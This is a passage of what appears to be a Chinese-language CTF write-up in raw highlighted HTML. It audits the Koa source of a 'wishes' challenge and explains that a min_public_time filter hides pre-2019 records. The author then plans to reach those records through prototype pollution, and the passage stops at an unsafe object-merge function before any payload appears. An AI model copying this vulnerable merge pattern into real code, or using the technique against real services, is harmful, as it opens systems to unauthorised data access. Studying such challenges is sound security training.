punctuation\">(</span><span class=\"token string\">\"../config\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">DEFAULT_CONFIG</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"../config.default\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 定义一个异步函数 getInfo，根据时间戳检索愿望数据</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">timestamp</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">// 检查时间戳是否为数字，否则使用当前时间戳</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    timestamp <span class=\"token operator\">=</span> <span class=\"token keyword\">typeof</span> timestamp <span class=\"token operator\">===</span> <span class=\"token string\">\"number\"</span> <span class=\"token operator\">?</span> timestamp <span class=\"token operator\">:</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 移除在指定的最小公开时间之前的测试数据</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">let</span> minTimestamp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONFIG</span><span class=\"token punctuation\">.</span>min_public_time <span class=\"token operator\">||</span> <span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    timestamp <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">,</span> minTimestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\">// 执行 SQL 查询以检索时间戳大于或等于提供的时间戳的愿望数据</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>timestamp<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">throw</span> e <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">// 返回检索到的数据</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">return</span> data<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">// 处理 POST 请求到 \"/info/:ts?\" 端点</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/info/:ts?\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">ctx</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">// 检查内容类型是否为 \"application/x-www-form-urlencoded\"</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">[</span><span class=\"token string\">\"content-type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">\"application/x-www-form-urlencoded\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Content-Type 必须为 application/x-www-form-urlencoded\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\">// 如果请求参数中未提供时间戳，则设置默认值为 0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> ctx<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>ts <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> ctx<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>ts <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token comment\">// 从请求参数解析时间戳并进行验证</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">const</span> timestamp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>ts <span class=\"token operator\">||</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>ts<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> ctx<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>ts<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> timestamp <span class=\"token operator\">!==</span> <span class=\"token string\">\"number\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"参数 ts 无效\"</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token comment\">// 调用 getInfo 函数根据提供的时间戳检索愿望数据</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">throw</span> e <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token comment\">// 发送包含检索到的数据的成功响应</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token literal-property property\">data</span><span class=\"token operator\">:</span> data</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token comment\">// 处理错误并发送错误响应</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"内部服务器错误\"</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">// 导出该路由以供其他模块使用</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> router<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>说白了关键点就在这里：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 移除在指定的最小公开时间之前的测试数据</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> minTimestamp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONFIG</span><span class=\"token punctuation\">.</span>min_public_time <span class=\"token operator\">||</span> <span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>timestamp <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">,</span> minTimestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这段代码用于确保时间戳  <code>timestamp</code>  不会早于指定的最小公开时间。首先，它从配置中获取最小公开时间（ <code>CONFIG.min_public_time</code> ），如果未定义，则使用默认配置中的值（ <code>DEFAULT_CONFIG.min_public_time</code> ）。然后，它将这个最小时间戳和传入的时间戳  <code>timestamp</code>  进行比较，取两者中较大的一个，确保最终的时间戳不会早于最小公开时间。</p>\n<p>看了下 config.js，发现并没有配置 min_public_time，而 default_config.min_public_time 中有    min_public_time: &quot;2019-07-09&quot;,</p>\n<p>所以我们不能查看 2019-07-09 前的数据，因此我们的目的就是为了能够看到 2019-07-09 前的数据。</p>\n<p>接下来就是找到能够进行原型链污染的地方，审计 submit.js:</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//submit.js</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 导入 Koa Router 模块</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> Router <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"koa-router\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 创建 Koa Router 的新实例</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> router <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Router</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 导入 SQL 模块（假设这是一个自定义模块）</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">SQL</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./sql\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 创建 SQL 类的新实例，表名为 \"wishes\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">const</span> sql <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wishes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 导入 Base58 模块</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">const</span> Base58 <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"base-58\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 定义 Base58 编码使用的字符集</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">ALPHABET</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 生成指定长度的随机文本</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">rndText</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">length</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> Array<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> length <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token constant\">ALPHABET</span><span class=\"token punctuation\">[</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token constant\">ALPHABET</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">// 生成时间戳的文本表示，并进行一定的处理后返回</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">timeText</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">timestamp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    timestamp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> timestamp <span class=\"token operator\">===</span> <span class=\"token string\">\"number\"</span> <span class=\"token operator\">?</span> timestamp <span class=\"token operator\">:</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">let</span> text1 <span class=\"token operator\">=</span> timestamp<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> timestamp<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">let</span> text2 <span class=\"token operator\">=</span> timestamp<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">let</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> text1<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        text <span class=\"token operator\">+=</span> text1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> text2<span class=\"token punctuation\">[</span>text2<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>text2<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> text1<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> text <span class=\"token operator\">+=</span> text2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> Base58<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">rndText</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 长度 = 20</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">// 生成指定长度的随机 ID，包括时间戳的文本表示</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">rndID</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">length<span class=\"token punctuation\">,</span> timestamp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">const</span> t <span class=\"token operator\">=</span> <span class=\"token function\">timeText</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">&lt;</span> t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> t <span class=\"token operator\">+</span> <span class=\"token function\">rndText</span><span class=\"token punctuation\">(</span>length <span class=\"token operator\">-</span> t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">// 插入数据到数据库的异步函数</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">insert2db</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">let</span> date <span class=\"token operator\">=</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"date\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> place <span class=\"token operator\">=</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"place\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        contact <span class=\"token operator\">=</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"contact\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> reason <span class=\"token operator\">=</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"reason\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">const</span> timestamp <span class=\"token operator\">=</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">const</span> wishid <span class=\"token operator\">=</span> <span class=\"token function\">rndID</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span> timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">await</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">[</span>wishid<span class=\"token punctuation\">,</span> date<span class=\"token punctuation\">,</span> place<span class=\"token punctuation\">,</span> contact<span class=\"token punctuation\">,</span> reason<span class=\"token punctuation\">,</span> timestamp<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">throw</span> e <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span> wishid<span class=\"token punctuation\">,</span> date<span class=\"token punctuation\">,</span> place<span class=\"token punctuation\">,</span> contact<span class=\"token punctuation\">,</span> reason<span class=\"token punctuation\">,</span> timestamp <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">// 合并两个对象的函数</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">merge</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">dst<span class=\"token punctuation\">,</span> src</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> dst <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">typeof</span> src <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 